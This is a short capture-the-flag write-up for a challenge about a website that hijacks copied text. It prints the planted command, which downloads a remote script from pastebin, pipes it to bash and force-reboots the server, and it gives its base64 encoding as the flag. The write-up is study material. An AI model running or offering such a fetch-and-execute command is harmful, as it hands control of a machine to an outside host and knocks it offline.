# Lazy SysAdmin #1


## Presentation 
Your system administrator calls you, all worried, he's just observed some strange behavior: the server he was connected on has suddenly shut down. After some questioning, you realize that he's been browsing on a suspicious wesite. You decide to inspect the website yourself. Will you be able to find the root of your problems ahead ?
Once you've found it, base64 the malicious charge.

Format : **HERO{base64(malicious charge)}** (no case-sensitive)
Example : HERO{YmFzZTY0IDQgbGlmZS4=}


## Write-up

Copy paste any sentences in one of the blogs and look at your buffer content 

```
curl -s https://pastebin.com/raw/2pdGb1Z0 | bash && sleep 2 && reboot -f
```

```
$ echo -n "curl -s https://pastebin.com/raw/2pdGb1Z0 | bash && sleep 2 && reboot -f" | base64 
Y3VybCAtcyBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvMnBkR2IxWjAgfCBiYXNoICYmIHNsZWVwIDIgJiYgcmVib290IC1m
```


flag : HERO{Y3VybCAtcyBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvMnBkR2IxWjAgfCBiYXNoICYmIHNsZWVwIDIgJiYgcmVib290IC1m}
